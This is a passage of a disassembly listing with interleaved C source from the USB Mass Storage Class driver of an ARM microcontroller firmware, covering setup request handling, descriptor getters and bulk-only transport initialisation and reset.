 8008f58:	683b      	ldr	r3, [r7, #0]
 8008f5a:	885b      	ldrh	r3, [r3, #2]
 8008f5c:	2b00      	cmp	r3, #0
 8008f5e:	d10c      	bne.n	8008f7a <USBD_MSC_Setup+0xc2>
 8008f60:	683b      	ldr	r3, [r7, #0]
 8008f62:	88db      	ldrh	r3, [r3, #6]
 8008f64:	2b00      	cmp	r3, #0
 8008f66:	d108      	bne.n	8008f7a <USBD_MSC_Setup+0xc2>
              ((req->bmRequest & 0x80U) != 0x80U))
 8008f68:	683b      	ldr	r3, [r7, #0]
 8008f6a:	781b      	ldrb	r3, [r3, #0]
 8008f6c:	b25b      	sxtb	r3, r3
          if ((req->wValue  == 0U) && (req->wLength == 0U) &&
 8008f6e:	2b00      	cmp	r3, #0
 8008f70:	db03      	blt.n	8008f7a <USBD_MSC_Setup+0xc2>
          {
            MSC_BOT_Reset(pdev);
 8008f72:	6878      	ldr	r0, [r7, #4]
 8008f74:	f000 f9bc 	bl	80092f0 <MSC_BOT_Reset>
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 8008f78:	e00d      	b.n	8008f96 <USBD_MSC_Setup+0xde>
            USBD_CtlError(pdev, req);
 8008f7a:	6839      	ldr	r1, [r7, #0]
 8008f7c:	6878      	ldr	r0, [r7, #4]
 8008f7e:	f003 f8ea 	bl	800c156 <USBD_CtlError>
            ret = USBD_FAIL;
 8008f82:	2303      	movs	r3, #3
 8008f84:	75fb      	strb	r3, [r7, #23]
          break;
 8008f86:	e006      	b.n	8008f96 <USBD_MSC_Setup+0xde>

        default:
          USBD_CtlError(pdev, req);
 8008f88:	6839      	ldr	r1, [r7, #0]
 8008f8a:	6878      	ldr	r0, [r7, #4]
 8008f8c:	f003 f8e3 	bl	800c156 <USBD_CtlError>
          ret = USBD_FAIL;
 8008f90:	2303      	movs	r3, #3
 8008f92:	75fb      	strb	r3, [r7, #23]
          break;
 8008f94:	bf00      	nop
      }
      break;
 8008f96:	e086      	b.n	80090a6 <USBD_MSC_Setup+0x1ee>
    /* Interface & Endpoint request */
    case USB_REQ_TYPE_STANDARD:
      switch (req->bRequest)
 8008f98:	683b      	ldr	r3, [r7, #0]
 8008f9a:	785b      	ldrb	r3, [r3, #1]
 8008f9c:	2b0b      	cmp	r3, #11
 8008f9e:	d872      	bhi.n	8009086 <USBD_MSC_Setup+0x1ce>
 8008fa0:	a201      	add	r2, pc, #4	; (adr r2, 8008fa8 <USBD_MSC_Setup+0xf0>)
 8008fa2:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8008fa6:	bf00      	nop
 8008fa8:	08008fd9 	.word	0x08008fd9
 8008fac:	08009055 	.word	0x08009055
 8008fb0:	08009087 	.word	0x08009087
 8008fb4:	08009087 	.word	0x08009087
 8008fb8:	08009087 	.word	0x08009087
 8008fbc:	08009087 	.word	0x08009087
 8008fc0:	08009087 	.word	0x08009087
 8008fc4:	08009087 	.word	0x08009087
 8008fc8:	08009087 	.word	0x08009087
 8008fcc:	08009087 	.word	0x08009087
 8008fd0:	08009003 	.word	0x08009003
 8008fd4:	0800902d 	.word	0x0800902d
      {
        case USB_REQ_GET_STATUS:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 8008fd8:	687b      	ldr	r3, [r7, #4]
 8008fda:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 8008fde:	b2db      	uxtb	r3, r3
 8008fe0:	2b03      	cmp	r3, #3
 8008fe2:	d107      	bne.n	8008ff4 <USBD_MSC_Setup+0x13c>
          {
            (void)USBD_CtlSendData(pdev, (uint8_t *)&status_info, 2U);
 8008fe4:	f107 030e 	add.w	r3, r7, #14
 8008fe8:	2202      	movs	r2, #2
 8008fea:	4619      	mov	r1, r3
 8008fec:	6878      	ldr	r0, [r7, #4]
 8008fee:	f003 f923 	bl	800c238 <USBD_CtlSendData>
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 8008ff2:	e050      	b.n	8009096 <USBD_MSC_Setup+0x1de>
            USBD_CtlError(pdev, req);
 8008ff4:	6839      	ldr	r1, [r7, #0]
 8008ff6:	6878      	ldr	r0, [r7, #4]
 8008ff8:	f003 f8ad 	bl	800c156 <USBD_CtlError>
            ret = USBD_FAIL;
 8008ffc:	2303      	movs	r3, #3
 8008ffe:	75fb      	strb	r3, [r7, #23]
          break;
 8009000:	e049      	b.n	8009096 <USBD_MSC_Setup+0x1de>

        case USB_REQ_GET_INTERFACE:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 8009002:	687b      	ldr	r3, [r7, #4]
 8009004:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 8009008:	b2db      	uxtb	r3, r3
 800900a:	2b03      	cmp	r3, #3
 800900c:	d107      	bne.n	800901e <USBD_MSC_Setup+0x166>
          {
            (void)USBD_CtlSendData(pdev, (uint8_t *)&hmsc->interface, 1U);
 800900e:	693b      	ldr	r3, [r7, #16]
 8009010:	3304      	adds	r3, #4
 8009012:	2201      	movs	r2, #1
 8009014:	4619      	mov	r1, r3
 8009016:	6878      	ldr	r0, [r7, #4]
 8009018:	f003 f90e 	bl	800c238 <USBD_CtlSendData>
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 800901c:	e03b      	b.n	8009096 <USBD_MSC_Setup+0x1de>
            USBD_CtlError(pdev, req);
 800901e:	6839      	ldr	r1, [r7, #0]
 8009020:	6878      	ldr	r0, [r7, #4]
 8009022:	f003 f898 	bl	800c156 <USBD_CtlError>
            ret = USBD_FAIL;
 8009026:	2303      	movs	r3, #3
 8009028:	75fb      	strb	r3, [r7, #23]
          break;
 800902a:	e034      	b.n	8009096 <USBD_MSC_Setup+0x1de>

        case USB_REQ_SET_INTERFACE:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800902c:	687b      	ldr	r3, [r7, #4]
 800902e:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 8009032:	b2db      	uxtb	r3, r3
 8009034:	2b03      	cmp	r3, #3
 8009036:	d106      	bne.n	8009046 <USBD_MSC_Setup+0x18e>
          {
            hmsc->interface = (uint8_t)(req->wValue);
 8009038:	683b      	ldr	r3, [r7, #0]
 800903a:	885b      	ldrh	r3, [r3, #2]
 800903c:	b2db      	uxtb	r3, r3
 800903e:	461a      	mov	r2, r3
 8009040:	693b      	ldr	r3, [r7, #16]
 8009042:	605a      	str	r2, [r3, #4]
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 8009044:	e027      	b.n	8009096 <USBD_MSC_Setup+0x1de>
            USBD_CtlError(pdev, req);
 8009046:	6839      	ldr	r1, [r7, #0]
 8009048:	6878      	ldr	r0, [r7, #4]
 800904a:	f003 f884 	bl	800c156 <USBD_CtlError>
            ret = USBD_FAIL;
 800904e:	2303      	movs	r3, #3
 8009050:	75fb      	strb	r3, [r7, #23]
          break;
 8009052:	e020      	b.n	8009096 <USBD_MSC_Setup+0x1de>

        case USB_REQ_CLEAR_FEATURE:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 8009054:	687b      	ldr	r3, [r7, #4]
 8009056:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800905a:	b2db      	uxtb	r3, r3
 800905c:	2b03      	cmp	r3, #3
 800905e:	d119      	bne.n	8009094 <USBD_MSC_Setup+0x1dc>
          {
            if (req->wValue == USB_FEATURE_EP_HALT)
 8009060:	683b      	ldr	r3, [r7, #0]
 8009062:	885b      	ldrh	r3, [r3, #2]
 8009064:	2b00      	cmp	r3, #0
 8009066:	d115      	bne.n	8009094 <USBD_MSC_Setup+0x1dc>
            {
              /* Flush the FIFO */
              (void)USBD_LL_FlushEP(pdev, (uint8_t)req->wIndex);
 8009068:	683b      	ldr	r3, [r7, #0]
 800906a:	889b      	ldrh	r3, [r3, #4]
 800906c:	b2db      	uxtb	r3, r3
 800906e:	4619      	mov	r1, r3
 8009070:	6878      	ldr	r0, [r7, #4]
 8009072:	f003 fdad 	bl	800cbd0 <USBD_LL_FlushEP>

              /* Handle BOT error */
              MSC_BOT_CplClrFeature(pdev, (uint8_t)req->wIndex);
 8009076:	683b      	ldr	r3, [r7, #0]
 8009078:	889b      	ldrh	r3, [r3, #4]
 800907a:	b2db      	uxtb	r3, r3
 800907c:	4619      	mov	r1, r3
 800907e:	6878      	ldr	r0, [r7, #4]
 8009080:	f000 fb54 	bl	800972c <MSC_BOT_CplClrFeature>
            }
          }
          break;
 8009084:	e006      	b.n	8009094 <USBD_MSC_Setup+0x1dc>

        default:
          USBD_CtlError(pdev, req);
 8009086:	6839      	ldr	r1, [r7, #0]
 8009088:	6878      	ldr	r0, [r7, #4]
 800908a:	f003 f864 	bl	800c156 <USBD_CtlError>
          ret = USBD_FAIL;
 800908e:	2303      	movs	r3, #3
 8009090:	75fb      	strb	r3, [r7, #23]
          break;
 8009092:	e000      	b.n	8009096 <USBD_MSC_Setup+0x1de>
          break;
 8009094:	bf00      	nop
      }
      break;
 8009096:	e006      	b.n	80090a6 <USBD_MSC_Setup+0x1ee>

    default:
      USBD_CtlError(pdev, req);
 8009098:	6839      	ldr	r1, [r7, #0]
 800909a:	6878      	ldr	r0, [r7, #4]
 800909c:	f003 f85b 	bl	800c156 <USBD_CtlError>
      ret = USBD_FAIL;
 80090a0:	2303      	movs	r3, #3
 80090a2:	75fb      	strb	r3, [r7, #23]
      break;
 80090a4:	bf00      	nop
  }

  return (uint8_t)ret;
 80090a6:	7dfb      	ldrb	r3, [r7, #23]
}
 80090a8:	4618      	mov	r0, r3
 80090aa:	3718      	adds	r7, #24
 80090ac:	46bd      	mov	sp, r7
 80090ae:	bd80      	pop	{r7, pc}

080090b0 <USBD_MSC_DataIn>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval status
  */
uint8_t USBD_MSC_DataIn(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 80090b0:	b580      	push	{r7, lr}
 80090b2:	b082      	sub	sp, #8
 80090b4:	af00      	add	r7, sp, #0
 80090b6:	6078      	str	r0, [r7, #4]
 80090b8:	460b      	mov	r3, r1
 80090ba:	70fb      	strb	r3, [r7, #3]
  MSC_BOT_DataIn(pdev, epnum);
 80090bc:	78fb      	ldrb	r3, [r7, #3]
 80090be:	4619      	mov	r1, r3
 80090c0:	6878      	ldr	r0, [r7, #4]
 80090c2:	f000 f961 	bl	8009388 <MSC_BOT_DataIn>

  return (uint8_t)USBD_OK;
 80090c6:	2300      	movs	r3, #0
}
 80090c8:	4618      	mov	r0, r3
 80090ca:	3708      	adds	r7, #8
 80090cc:	46bd      	mov	sp, r7
 80090ce:	bd80      	pop	{r7, pc}

080090d0 <USBD_MSC_DataOut>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval status
  */
uint8_t USBD_MSC_DataOut(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 80090d0:	b580      	push	{r7, lr}
 80090d2:	b082      	sub	sp, #8
 80090d4:	af00      	add	r7, sp, #0
 80090d6:	6078      	str	r0, [r7, #4]
 80090d8:	460b      	mov	r3, r1
 80090da:	70fb      	strb	r3, [r7, #3]
  MSC_BOT_DataOut(pdev, epnum);
 80090dc:	78fb      	ldrb	r3, [r7, #3]
 80090de:	4619      	mov	r1, r3
 80090e0:	6878      	ldr	r0, [r7, #4]
 80090e2:	f000 f98d 	bl	8009400 <MSC_BOT_DataOut>

  return (uint8_t)USBD_OK;
 80090e6:	2300      	movs	r3, #0
}
 80090e8:	4618      	mov	r0, r3
 80090ea:	3708      	adds	r7, #8
 80090ec:	46bd      	mov	sp, r7
 80090ee:	bd80      	pop	{r7, pc}

080090f0 <USBD_MSC_GetHSCfgDesc>:
  *         return configuration descriptor
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
uint8_t *USBD_MSC_GetHSCfgDesc(uint16_t *length)
{
 80090f0:	b580      	push	{r7, lr}
 80090f2:	b084      	sub	sp, #16
 80090f4:	af00      	add	r7, sp, #0
 80090f6:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPIN_ADDR);
 80090f8:	2181      	movs	r1, #129	; 0x81
 80090fa:	4812      	ldr	r0, [pc, #72]	; (8009144 <USBD_MSC_GetHSCfgDesc+0x54>)
 80090fc:	f002 f9c8 	bl	800b490 <USBD_GetEpDesc>
 8009100:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPOUT_ADDR);
 8009102:	2101      	movs	r1, #1
 8009104:	480f      	ldr	r0, [pc, #60]	; (8009144 <USBD_MSC_GetHSCfgDesc+0x54>)
 8009106:	f002 f9c3 	bl	800b490 <USBD_GetEpDesc>
 800910a:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 800910c:	68fb      	ldr	r3, [r7, #12]
 800910e:	2b00      	cmp	r3, #0
 8009110:	d006      	beq.n	8009120 <USBD_MSC_GetHSCfgDesc+0x30>
  {
    pEpInDesc->wMaxPacketSize = MSC_MAX_HS_PACKET;
 8009112:	68fb      	ldr	r3, [r7, #12]
 8009114:	2200      	movs	r2, #0
 8009116:	711a      	strb	r2, [r3, #4]
 8009118:	2200      	movs	r2, #0
 800911a:	f042 0202 	orr.w	r2, r2, #2
 800911e:	715a      	strb	r2, [r3, #5]
  }

  if (pEpOutDesc != NULL)
 8009120:	68bb      	ldr	r3, [r7, #8]
 8009122:	2b00      	cmp	r3, #0
 8009124:	d006      	beq.n	8009134 <USBD_MSC_GetHSCfgDesc+0x44>
  {
    pEpOutDesc->wMaxPacketSize = MSC_MAX_HS_PACKET;
 8009126:	68bb      	ldr	r3, [r7, #8]
 8009128:	2200      	movs	r2, #0
 800912a:	711a      	strb	r2, [r3, #4]
 800912c:	2200      	movs	r2, #0
 800912e:	f042 0202 	orr.w	r2, r2, #2
 8009132:	715a      	strb	r2, [r3, #5]
  }

  *length = (uint16_t)sizeof(USBD_MSC_CfgDesc);
 8009134:	687b      	ldr	r3, [r7, #4]
 8009136:	2220      	movs	r2, #32
 8009138:	801a      	strh	r2, [r3, #0]
  return USBD_MSC_CfgDesc;
 800913a:	4b02      	ldr	r3, [pc, #8]	; (8009144 <USBD_MSC_GetHSCfgDesc+0x54>)
}
 800913c:	4618      	mov	r0, r3
 800913e:	3710      	adds	r7, #16
 8009140:	46bd      	mov	sp, r7
 8009142:	bd80      	pop	{r7, pc}
 8009144:	200000e0 	.word	0x200000e0

08009148 <USBD_MSC_GetFSCfgDesc>:
  *         return configuration descriptor
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
uint8_t *USBD_MSC_GetFSCfgDesc(uint16_t *length)
{
 8009148:	b580      	push	{r7, lr}
 800914a:	b084      	sub	sp, #16
 800914c:	af00      	add	r7, sp, #0
 800914e:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPIN_ADDR);
 8009150:	2181      	movs	r1, #129	; 0x81
 8009152:	4812      	ldr	r0, [pc, #72]	; (800919c <USBD_MSC_GetFSCfgDesc+0x54>)
 8009154:	f002 f99c 	bl	800b490 <USBD_GetEpDesc>
 8009158:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPOUT_ADDR);
 800915a:	2101      	movs	r1, #1
 800915c:	480f      	ldr	r0, [pc, #60]	; (800919c <USBD_MSC_GetFSCfgDesc+0x54>)
 800915e:	f002 f997 	bl	800b490 <USBD_GetEpDesc>
 8009162:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 8009164:	68fb      	ldr	r3, [r7, #12]
 8009166:	2b00      	cmp	r3, #0
 8009168:	d006      	beq.n	8009178 <USBD_MSC_GetFSCfgDesc+0x30>
  {
    pEpInDesc->wMaxPacketSize = MSC_MAX_FS_PACKET;
 800916a:	68fb      	ldr	r3, [r7, #12]
 800916c:	2200      	movs	r2, #0
 800916e:	f042 0240 	orr.w	r2, r2, #64	; 0x40
 8009172:	711a      	strb	r2, [r3, #4]
 8009174:	2200      	movs	r2, #0
 8009176:	715a      	strb	r2, [r3, #5]
  }

  if (pEpOutDesc != NULL)
 8009178:	68bb      	ldr	r3, [r7, #8]
 800917a:	2b00      	cmp	r3, #0
 800917c:	d006      	beq.n	800918c <USBD_MSC_GetFSCfgDesc+0x44>
  {
    pEpOutDesc->wMaxPacketSize = MSC_MAX_FS_PACKET;
 800917e:	68bb      	ldr	r3, [r7, #8]
 8009180:	2200      	movs	r2, #0
 8009182:	f042 0240 	orr.w	r2, r2, #64	; 0x40
 8009186:	711a      	strb	r2, [r3, #4]
 8009188:	2200      	movs	r2, #0
 800918a:	715a      	strb	r2, [r3, #5]
  }

  *length = (uint16_t)sizeof(USBD_MSC_CfgDesc);
 800918c:	687b      	ldr	r3, [r7, #4]
 800918e:	2220      	movs	r2, #32
 8009190:	801a      	strh	r2, [r3, #0]
  return USBD_MSC_CfgDesc;
 8009192:	4b02      	ldr	r3, [pc, #8]	; (800919c <USBD_MSC_GetFSCfgDesc+0x54>)
}
 8009194:	4618      	mov	r0, r3
 8009196:	3710      	adds	r7, #16
 8009198:	46bd      	mov	sp, r7
 800919a:	bd80      	pop	{r7, pc}
 800919c:	200000e0 	.word	0x200000e0

080091a0 <USBD_MSC_GetOtherSpeedCfgDesc>:
  *         return other speed configuration descriptor
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
uint8_t *USBD_MSC_GetOtherSpeedCfgDesc(uint16_t *length)
{
 80091a0:	b580      	push	{r7, lr}
 80091a2:	b084      	sub	sp, #16
 80091a4:	af00      	add	r7, sp, #0
 80091a6:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPIN_ADDR);
 80091a8:	2181      	movs	r1, #129	; 0x81
 80091aa:	4812      	ldr	r0, [pc, #72]	; (80091f4 <USBD_MSC_GetOtherSpeedCfgDesc+0x54>)
 80091ac:	f002 f970 	bl	800b490 <USBD_GetEpDesc>
 80091b0:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPOUT_ADDR);
 80091b2:	2101      	movs	r1, #1
 80091b4:	480f      	ldr	r0, [pc, #60]	; (80091f4 <USBD_MSC_GetOtherSpeedCfgDesc+0x54>)
 80091b6:	f002 f96b 	bl	800b490 <USBD_GetEpDesc>
 80091ba:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 80091bc:	68fb      	ldr	r3, [r7, #12]
 80091be:	2b00      	cmp	r3, #0
 80091c0:	d006      	beq.n	80091d0 <USBD_MSC_GetOtherSpeedCfgDesc+0x30>
  {
    pEpInDesc->wMaxPacketSize = MSC_MAX_FS_PACKET;
 80091c2:	68fb      	ldr	r3, [r7, #12]
 80091c4:	2200      	movs	r2, #0
 80091c6:	f042 0240 	orr.w	r2, r2, #64	; 0x40
 80091ca:	711a      	strb	r2, [r3, #4]
 80091cc:	2200      	movs	r2, #0
 80091ce:	715a      	strb	r2, [r3, #5]
  }

  if (pEpOutDesc != NULL)
 80091d0:	68bb      	ldr	r3, [r7, #8]
 80091d2:	2b00      	cmp	r3, #0
 80091d4:	d006      	beq.n	80091e4 <USBD_MSC_GetOtherSpeedCfgDesc+0x44>
  {
    pEpOutDesc->wMaxPacketSize = MSC_MAX_FS_PACKET;
 80091d6:	68bb      	ldr	r3, [r7, #8]
 80091d8:	2200      	movs	r2, #0
 80091da:	f042 0240 	orr.w	r2, r2, #64	; 0x40
 80091de:	711a      	strb	r2, [r3, #4]
 80091e0:	2200      	movs	r2, #0
 80091e2:	715a      	strb	r2, [r3, #5]
  }

  *length = (uint16_t)sizeof(USBD_MSC_CfgDesc);
 80091e4:	687b      	ldr	r3, [r7, #4]
 80091e6:	2220      	movs	r2, #32
 80091e8:	801a      	strh	r2, [r3, #0]
  return USBD_MSC_CfgDesc;
 80091ea:	4b02      	ldr	r3, [pc, #8]	; (80091f4 <USBD_MSC_GetOtherSpeedCfgDesc+0x54>)
}
 80091ec:	4618      	mov	r0, r3
 80091ee:	3710      	adds	r7, #16
 80091f0:	46bd      	mov	sp, r7
 80091f2:	bd80      	pop	{r7, pc}
 80091f4:	200000e0 	.word	0x200000e0

080091f8 <USBD_MSC_GetDeviceQualifierDescriptor>:
  *         return Device Qualifier descriptor
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
uint8_t *USBD_MSC_GetDeviceQualifierDescriptor(uint16_t *length)
{
 80091f8:	b480      	push	{r7}
 80091fa:	b083      	sub	sp, #12
 80091fc:	af00      	add	r7, sp, #0
 80091fe:	6078      	str	r0, [r7, #4]
  *length = (uint16_t)sizeof(USBD_MSC_DeviceQualifierDesc);
 8009200:	687b      	ldr	r3, [r7, #4]
 8009202:	220a      	movs	r2, #10
 8009204:	801a      	strh	r2, [r3, #0]

  return USBD_MSC_DeviceQualifierDesc;
 8009206:	4b03      	ldr	r3, [pc, #12]	; (8009214 <USBD_MSC_GetDeviceQualifierDescriptor+0x1c>)
}
 8009208:	4618      	mov	r0, r3
 800920a:	370c      	adds	r7, #12
 800920c:	46bd      	mov	sp, r7
 800920e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8009212:	4770      	bx	lr
 8009214:	20000100 	.word	0x20000100

08009218 <USBD_MSC_RegisterStorage>:
  * @brief  USBD_MSC_RegisterStorage
  * @param  fops: storage callback
  * @retval status
  */
uint8_t USBD_MSC_RegisterStorage(USBD_HandleTypeDef *pdev, USBD_StorageTypeDef *fops)
{
 8009218:	b480      	push	{r7}
 800921a:	b083      	sub	sp, #12
 800921c:	af00      	add	r7, sp, #0
 800921e:	6078      	str	r0, [r7, #4]
 8009220:	6039      	str	r1, [r7, #0]
  if (fops == NULL)
 8009222:	683b      	ldr	r3, [r7, #0]
 8009224:	2b00      	cmp	r3, #0
 8009226:	d101      	bne.n	800922c <USBD_MSC_RegisterStorage+0x14>
  {
    return (uint8_t)USBD_FAIL;
 8009228:	2303      	movs	r3, #3
 800922a:	e009      	b.n	8009240 <USBD_MSC_RegisterStorage+0x28>
  }

  pdev->pUserData[pdev->classId] = fops;
 800922c:	687b      	ldr	r3, [r7, #4]
 800922e:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009232:	687a      	ldr	r2, [r7, #4]
 8009234:	33b0      	adds	r3, #176	; 0xb0
 8009236:	009b      	lsls	r3, r3, #2
 8009238:	4413      	add	r3, r2
 800923a:	683a      	ldr	r2, [r7, #0]
 800923c:	605a      	str	r2, [r3, #4]

  return (uint8_t)USBD_OK;
 800923e:	2300      	movs	r3, #0
}
 8009240:	4618      	mov	r0, r3
 8009242:	370c      	adds	r7, #12
 8009244:	46bd      	mov	sp, r7
 8009246:	f85d 7b04 	ldr.w	r7, [sp], #4
 800924a:	4770      	bx	lr

0800924c <MSC_BOT_Init>:
  *         Initialize the BOT Process
  * @param  pdev: device instance
  * @retval None
  */
void MSC_BOT_Init(USBD_HandleTypeDef *pdev)
{
 800924c:	b580      	push	{r7, lr}
 800924e:	b084      	sub	sp, #16
 8009250:	af00      	add	r7, sp, #0
 8009252:	6078      	str	r0, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009254:	687b      	ldr	r3, [r7, #4]
 8009256:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800925a:	687b      	ldr	r3, [r7, #4]
 800925c:	32b0      	adds	r2, #176	; 0xb0
 800925e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009262:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 8009264:	68fb      	ldr	r3, [r7, #12]
 8009266:	2b00      	cmp	r3, #0
 8009268:	d039      	beq.n	80092de <MSC_BOT_Init+0x92>
  {
    return;
  }

  hmsc->bot_state = USBD_BOT_IDLE;
 800926a:	68fb      	ldr	r3, [r7, #12]
 800926c:	2200      	movs	r2, #0
 800926e:	721a      	strb	r2, [r3, #8]
  hmsc->bot_status = USBD_BOT_STATUS_NORMAL;
 8009270:	68fb      	ldr	r3, [r7, #12]
 8009272:	2200      	movs	r2, #0
 8009274:	725a      	strb	r2, [r3, #9]

  hmsc->scsi_sense_tail = 0U;
 8009276:	68fb      	ldr	r3, [r7, #12]
 8009278:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800927c:	2200      	movs	r2, #0
 800927e:	f883 2061 	strb.w	r2, [r3, #97]	; 0x61
  hmsc->scsi_sense_head = 0U;
 8009282:	68fb      	ldr	r3, [r7, #12]
 8009284:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009288:	2200      	movs	r2, #0
 800928a:	f883 2060 	strb.w	r2, [r3, #96]	; 0x60
  hmsc->scsi_medium_state = SCSI_MEDIUM_UNLOCKED;
 800928e:	68fb      	ldr	r3, [r7, #12]
 8009290:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009294:	2200      	movs	r2, #0
 8009296:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62

  ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->Init(0U);
 800929a:	687b      	ldr	r3, [r7, #4]
 800929c:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 80092a0:	687a      	ldr	r2, [r7, #4]
 80092a2:	33b0      	adds	r3, #176	; 0xb0
 80092a4:	009b      	lsls	r3, r3, #2
 80092a6:	4413      	add	r3, r2
 80092a8:	685b      	ldr	r3, [r3, #4]
 80092aa:	681b      	ldr	r3, [r3, #0]
 80092ac:	2000      	movs	r0, #0
 80092ae:	4798      	blx	r3

  (void)USBD_LL_FlushEP(pdev, MSCOutEpAdd);
 80092b0:	4b0d      	ldr	r3, [pc, #52]	; (80092e8 <MSC_BOT_Init+0x9c>)
 80092b2:	781b      	ldrb	r3, [r3, #0]
 80092b4:	4619      	mov	r1, r3
 80092b6:	6878      	ldr	r0, [r7, #4]
 80092b8:	f003 fc8a 	bl	800cbd0 <USBD_LL_FlushEP>
  (void)USBD_LL_FlushEP(pdev, MSCInEpAdd);
 80092bc:	4b0b      	ldr	r3, [pc, #44]	; (80092ec <MSC_BOT_Init+0xa0>)
 80092be:	781b      	ldrb	r3, [r3, #0]
 80092c0:	4619      	mov	r1, r3
 80092c2:	6878      	ldr	r0, [r7, #4]
 80092c4:	f003 fc84 	bl	800cbd0 <USBD_LL_FlushEP>

  /* Prepare EP to Receive First BOT Cmd */
  (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, (uint8_t *)&hmsc->cbw,
 80092c8:	4b07      	ldr	r3, [pc, #28]	; (80092e8 <MSC_BOT_Init+0x9c>)
 80092ca:	7819      	ldrb	r1, [r3, #0]
 80092cc:	68fb      	ldr	r3, [r7, #12]
 80092ce:	f503 5280 	add.w	r2, r3, #4096	; 0x1000
 80092d2:	3210      	adds	r2, #16
 80092d4:	231f      	movs	r3, #31
 80092d6:	6878      	ldr	r0, [r7, #4]
 80092d8:	f003 fdb8 	bl	800ce4c <USBD_LL_PrepareReceive>
 80092dc:	e000      	b.n	80092e0 <MSC_BOT_Init+0x94>
    return;
 80092de:	bf00      	nop
                               USBD_BOT_CBW_LENGTH);
}
 80092e0:	3710      	adds	r7, #16
 80092e2:	46bd      	mov	sp, r7
 80092e4:	bd80      	pop	{r7, pc}
 80092e6:	bf00      	nop
 80092e8:	2000010b 	.word	0x2000010b
 80092ec:	2000010a 	.word	0x2000010a

080092f0 <MSC_BOT_Reset>:
  *         Reset the BOT Machine
  * @param  pdev: device instance
  * @retval  None
  */
void MSC_BOT_Reset(USBD_HandleTypeDef *pdev)
{
 80092f0:	b580      	push	{r7, lr}
 80092f2:	b084      	sub	sp, #16
 80092f4:	af00      	add	r7, sp, #0
 80092f6:	6078      	str	r0, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 80092f8:	687b      	ldr	r3, [r7, #4]
 80092fa:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80092fe:	687b      	ldr	r3, [r7, #4]
 8009300:	32b0      	adds	r2, #176	; 0xb0
 8009302:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009306:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 8009308:	68fb      	ldr	r3, [r7, #12]
 800930a:	2b00      	cmp	r3, #0
 800930c:	d01c      	beq.n	8009348 <MSC_BOT_Reset+0x58>
  {
    return;
  }

  hmsc->bot_state  = USBD_BOT_IDLE;
